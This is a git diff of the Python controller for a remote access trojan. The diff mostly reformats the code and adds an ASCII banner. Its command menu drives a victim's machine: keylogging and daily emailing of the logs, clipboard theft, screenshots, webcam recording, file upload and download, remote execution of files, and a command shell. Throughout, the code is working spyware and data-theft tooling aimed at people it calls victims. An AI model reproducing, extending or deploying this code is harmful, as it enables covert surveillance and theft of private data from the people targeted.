@@ -28,11 +28,11 @@ import cv2
 
 
 class Server:
-# '''SOCKET SET UP STARTS HERE'''
+    # '''SOCKET SET UP STARTS HERE'''
     def __init__(self, ip, port, buffer_size):
         self.IP = ip
         self.PORT = port
-        #self.BACKUP_PORT = 8080
+        # self.BACKUP_PORT = 8080
         self.BUFFER_SIZE = buffer_size
         self.connections = []  # connections list
         self.info = ""  # info about target
@@ -51,7 +51,7 @@ class Server:
             "-weather": self.weather,
             "-telnet": self.enableTN,
             "-KLstart": self.startKeyLogger,
-            #"-KLend": self.stopKeyLogger,
+            # "-KLend": self.stopKeyLogger,
             "-getLogs": self.getKeyLogs,
             "-getcb": self.getClipBoard,
             "-Fsend": self.filesend,
@@ -60,17 +60,26 @@ class Server:
             "-exe": self.exePy,
             "-ss": self.screenshot,
             "-vid": self.vidByFrames,
-            "-WCrec":self.webcamRec,
-            "-WCplay":self.webcamPlay,
+            "-WCrec": self.webcamRec,
+            "-WCplay": self.webcamPlay,
             "-shell": self.cmdctrl,
             "-email": self.email,
             "-dailymail": self.startEmailthread,
             "-endmailer": self.stopEmailThread,
-            "-clear":self.clear,
+            "-clear": self.clear,
             "-drop": self.closeConnection,
             "-disc": self.disconnectTarget,
             "-menu": self.mainmenu
         }
+
+    def label(self):
+        print(''' __    __    ______   .______          ___   .___________.
+|  |  |  |  /  __  \  |   _  \        /   \  |           |
+|  |  |  | |  |  |  | |  |_)  |      /  ^  \ `---|  |----`
+|  |  |  | |  |  |  | |      /      /  /_\  \    |  |     
+|  `--'  | |  `--'  | |  |\  \----./  _____  \   |  |     
+ \______/   \______/  | _| `._____/__/     \__\  |__|     
+                                                 ''')
 
     def mainmenu(self):
 
@@ -102,7 +111,7 @@ class Server:
             "-dailymail": "Start a thread to Email the keylog files at a given time everyday",
             "-endmailer": "Stop the email schedule thread",
             "-drop": "\tDrop the connection",
-            #"-disc": "\tDisconnect session, keep client alive ",
+            # "-disc": "\tDisconnect session, keep client alive ",
             "-clear": "Clear Console",
             "-Menu": "\tPrint this menu again"
         }
@@ -113,14 +122,14 @@ class Server:
 
     def startEmailthread(self):
         command = "-dailymail"
-        self.client_socket.send(command.encode())
-        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
+        self.client_socket.send(command.encode('utf-8'))
+        response = self.client_socket.recv(self.BUFFER_SIZE).decode('utf-8')
         print(response)
 
     def stopEmailThread(self):
         command = "-endmailer"
-        self.client_socket.send(command.encode())
-        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
+        self.client_socket.send(command.encode('utf-8'))
+        response = self.client_socket.recv(self.BUFFER_SIZE).decode('utf-8')
         print(response)
 
     def clear(self):
@@ -163,23 +172,23 @@ class Server:
 
         self.client_socket.send(key.encode("utf-8"))
 
-        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
+        response = self.client_socket.recv(self.BUFFER_SIZE).decode('utf-8')
         if response == "[#] KEY MISMATCH":
             self.closeConnection()
 
     def closeConnection(self):
-        self.client_socket.send("-drop".encode())
+        self.client_socket.send("-drop".encode('utf-8'))
         self.connections.remove(self.client_socket)
         self.client_socket.close()
         self.server.close()
         sys.exit()
 
     def disconnectTarget(self):
-        self.client_socket.send("-disc".encode())
+        self.client_socket.send("-disc".encode('utf-8'))
         self.connections.remove(self.client_socket)
         self.client_socket.close()
         sys.exit()
-        # self.client_socket.send("-disc".encode())
+        # self.client_socket.send("-disc".encode('utf-8'))
         # self.connections.remove(self.client_socket)
         # self.client_socket.close()
         # self.server.close()
@@ -207,18 +216,19 @@ class Server:
 
         return full
 
-# ''' SOCKET SET UP ENDS HERE '''
+    # ''' SOCKET SET UP ENDS HERE '''
 
-# ''' COMMAND FUNCTIONS START HERE'''
+    # ''' COMMAND FUNCTIONS START HERE'''
     '''WINDOWS FUNCTIONS'''
+
     def sendMsg(self):
         command = "-msg"
-        self.client_socket.send(command.encode())
+        self.client_socket.send(command.encode('utf-8'))
         msg = input("[+] Enter message: ")
         time.sleep(2)
-        self.client_socket.send(msg.encode())
+        self.client_socket.send(msg.encode('utf-8'))
         print(msg)
-        results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
+        results = (self.client_socket.recv(self.BUFFER_SIZE).decode('utf-8'))
         print(results)
 
     def shutdown(self):
@@ -235,9 +245,9 @@ class Server:
         self.client_socket.send(command.encode("utf-8"))
         msg = input("[+] Enter message: ")
         time.sleep(2)
-        self.client_socket.send(msg.encode())
+        self.client_socket.send(msg.encode('utf-8'))
         print(msg)
-        results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
+        results = (self.client_socket.recv(self.BUFFER_SIZE).decode('utf-8'))
         print(results)
 
         self.client_socket.close()
@@ -258,15 +268,15 @@ class Server:
     ## TODO: CHECK THIS
     def systemmsg(self):
         command = "-msgbox"
-        self.client_socket.send(command.encode())
+        self.client_socket.send(command.encode('utf-8'))
         msg = input("[+] Enter message: ")
         time.sleep(2)
-        self.client_socket.send(msg.encode())
+        self.client_socket.send(msg.encode('utf-8'))
         print(msg)
-        results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
+        results = (self.client_socket.recv(self.BUFFER_SIZE).decode('utf-8'))
         print(results)
 
-# '''TELNET FUNCTIONS'''
+    # '''TELNET FUNCTIONS'''
     def playstarwars(self):
         command = "-EpIV"
         self.client_socket.send(command.encode("utf-8"))
@@ -307,7 +317,7 @@ class Server:
             print("Something went Wrong")
         print(status)
 
-# ''' KEYLOGGER FUNCTIONS '''
+    # ''' KEYLOGGER FUNCTIONS '''
     def startKeyLogger(self):
         command = "-KLstart"
         self.client_socket.send(command.encode("utf-8"))
@@ -322,7 +332,7 @@ class Server:
 
     def retrievelogs(self):
 
-    # """ Receiving the keylogger files """
+        # """ Receiving the keylogger files """
         command = "--getlogs"
         self.client_socket.send(command.encode("utf-8"))
 
@@ -396,20 +406,16 @@ class Server:
 
     def getClipBoard(self):
         """ Get victim' clipboard in plain text """
-
         command = "-getcb"
         self.client_socket.send(command.encode("utf-8"))
-
         # recv clipboard
         cb = self.client_socket.recv(self.BUFFER_SIZE)
         print("*** Got clipboard ***")
-
         with open('../receivedfile/cb.txt', 'w+') as f:
             f.write(cb.decode("utf-8"))
-
         print("*** Wrote it to cb.txt ***")
 
-# ''' FILE HANDLING '''
+    # ''' FILE HANDLING '''
     def filesend(self):
         command = "-Fsend"
         self.client_socket.send(command.encode("utf-8"))
@@ -446,11 +452,11 @@ class Server:
                 print("*** File saved ***")
                 self.recvcounter += 1
         else:
-            print(response.decode("utf-8"))
+            print(response)
 
     def filereceive(self):
         command = "-Frecv"
-        self.client_socket.send(command.encode())
+        self.client_socket.send(command.encode('utf-8'))
 
         while True:
             try:
@@ -463,12 +469,13 @@ class Server:
             except FileNotFoundError:
                 print("[!] File not found, retry")
 
-        name = input("[+] Enter the name to save this file as on the victims device (include file extension): ")  # file name, must include extension
+        name = input(
+            "[+] Enter the name to save this file as on the victims device (include file extension): ")  # file name, must include extension
         self.client_socket.send(name.encode("utf-8"))
 
         with open(path, 'rb') as to_send:
             fsize = os.path.getsize(path)
-            self.client_socket.send(str(fsize).encode())
+            self.client_socket.send(str(fsize).encode('utf-8'))
             time.sleep(1)
 
             data = to_send.read()
@@ -477,15 +484,13 @@ class Server:
 
     def email(self):
         command = "-email"
-        self.client_socket.send(command.encode())
+        self.client_socket.send(command.encode('utf-8'))
         path = input("[+] Enter the file path of the designated file to have emailed: ")
         self.client_socket.send(path.encode("utf-8"))
-        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
+        response = self.client_socket.recv(self.BUFFER_SIZE).decode('utf-8')
         print(response)
 
-
-
-# ''' MISC '''
+    # ''' MISC '''
 
     def getTargetInfo(self):
         print("here")
@@ -500,16 +505,16 @@ class Server:
         emsize = self.client_socket.recv(self.BUFFER_SIZE).decode("UTF-8")
         print("emsize =" + str(emsize))
         if int(emsize) >= self.BUFFER_SIZE:
-            print("bigboi")
+            print("This is a large output")
             buff = self.updateBuffer(emsize)
             print("buffer = " + str(buff))
             evenmore = self.saveBigFile(int(emsize), buff)
-            print("evenmore =" + str(evenmore.decode()))
+            print("evenmore =" + str(evenmore.decode('utf-8')))
         else:
             evenmore = self.client_socket.recv(self.BUFFER_SIZE)
         moresysinfo = input("Would you like to see more?: ")
         if moresysinfo == "yes":
-            print(more.decode())
+            print(more.decode('utf-8'))
 
         print(moresysinfo + "\n\n")
         """ writing additional information in a file """
@@ -528,21 +533,21 @@ class Server:
         return info
 
     def exePy(self):
-        command ="-exe"
-        self.client_socket.send(command.encode())
+        command = "-exe"
+        self.client_socket.send(command.encode('utf-8'))
         filename = input("[+] Enter the full filepath: ")
-        self.client_socket.send(filename.encode())
+        self.client_socket.send(filename.encode('utf-8'))
         print("FilePath Sent")
-        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
+        response = self.client_socket.recv(self.BUFFER_SIZE).decode('utf-8')
         print("*** " + response + " *** ")
 
-# ''' SCREENSHOT FUNCTIONS '''
+    # ''' SCREENSHOT FUNCTIONS '''
     def screenshot(self):
         command = "-ss"
-        self.client_socket.send(command.encode())
+        self.client_socket.send(command.encode('utf-8'))
 
         # recv file size
-        recvsize = self.client_socket.recv(self.BUFFER_SIZE).decode()
+        recvsize = self.client_socket.recv(self.BUFFER_SIZE).decode('utf-8')
         time.sleep(0.1)
 
         # updating buffer
@@ -562,13 +567,13 @@ class Server:
         # ''' this will take n*x screenshots where n = number of seconds and x = frames per seconds
         n = 5  # Number of seconds
         x = 24  # Frames per second
-        for i in range(x*n):
+        for i in range(x * n):
             self.screenshot()
-            time.sleep(1/x)
+            time.sleep(1 / x)
 
     def webcamPlay(self):
 
-        #path = f'../receivedfile/webcam{str(self.recvcounter - 1)}'
+        # path = f'../receivedfile/webcam{str(self.recvcounter - 1)}'
         path = f'../receivedfile/webcamS'
         path2 = f'../receivedfile/webcamS/logs/Video'
         print(str(path))
@@ -622,43 +627,43 @@ class Server:
         else:
             print(response.decode("utf-8"))
 
-# ''' MAIN BULK '''
+    # ''' MAIN BULK '''
     def commands(self):
-            self.mainmenu()
-            # os.system("clear")
-            while True:
-             # get the command from prompt
-                command = input("Enter the command you want to execute:")
-                # send the command to the client
-                print(command)
-                # self.client_socket.send(command.encode())
+        self.label()
+        self.mainmenu()
+        # os.system("clear")
+        while True:
+            # get the command from prompt
+            command = input("Enter the command you want to execute:")
+            # send the command to the client
+            print(command)
+            # self.client_socket.send(command.encode('utf-8'))
 
-                if command == "exit":
-                    # if the command is exit, just break out of the loop
-                    break
-                else:
-                    try:
-                        func = self.Switcher.get(command)
-                        func()
-                    except TypeError:
-                        print("This operation does not exist. ")
-                    except ConnectionResetError:
-                        """ if the target hard-closes the connection we will receive only a RST packet (TCP), so here we close the connection safely """
+            if command == "exit":
+                # if the command is exit, just break out of the loop
+                break
+            else:
+                try:
+                    func = self.Switcher.get(command)
+                    func()
+                except TypeError:
+                    print("This operation does not exist. ")
+                except ConnectionResetError:
+                    """ if target hard-closes the connection, Only RST packet (TCP) Received, so close connection safely """
+                    print("[!] Connection Reset Error")
+                    self.closeConnection()
+                except KeyboardInterrupt:
+                    print("\n[ STOPPED RECEIVING DATA ]")
+                except Exception as e:
+                    print("Even I don't know how you got this error - so I'll lock the pc. " + str(e))
 
-                        print("[!] Connection Reset Error")
-                        #self.closeConnection()
-                    except KeyboardInterrupt:
-                        print("\n[ STOPPED RECEIVING DATA ]")
-                    except Exception as e:
-                        print("Even I don't know how you got this error - so I'll lock the pc. " + str(e))
+        sys.exit()
+        # close connection to the client
+        self.client_socket.close()
+        # close server connection
+        self.close()
 
-            sys.exit()
-            # close connection to the client
-            self.client_socket.close()
-            # close server connection
-            self.close()
-
-            print(results)
+        print(results)
 
     def cmdctrl(self):
         """ This is not a real interactive shell, you get the output
@@ -666,7 +671,8 @@ class Server:
 
         print("[!] -back to exit shell")
         while True:
-            cmd = input(f"[{self.address[0]}]$ ") # can't .lower() here as sent commands may include uppercase characters
+            cmd = input(
+                f"[{self.address[0]}]$ ")  # can't .lower() here as sent commands may include uppercase characters
 
             if not cmd:
                 print("[!] Can't send empty command.")
@@ -694,8 +700,6 @@ class Server:
             print(output.decode("utf-8"))
 
 
-
-
 def main():
     """ Creating the necessary dirs """
 
@@ -719,10 +723,9 @@ def main():
     except Exception as e:
         print("*** Error while starting the server:", str(e) + " ***")
     # just sending a message, for demonstration purposes
-    message = "Hello and Welcome".encode()
+    message = "Hello and Welcome".encode('utf-8')
     # server.client_socket.send(message)
 
 
 if __name__ == "__main__":
     main()
-
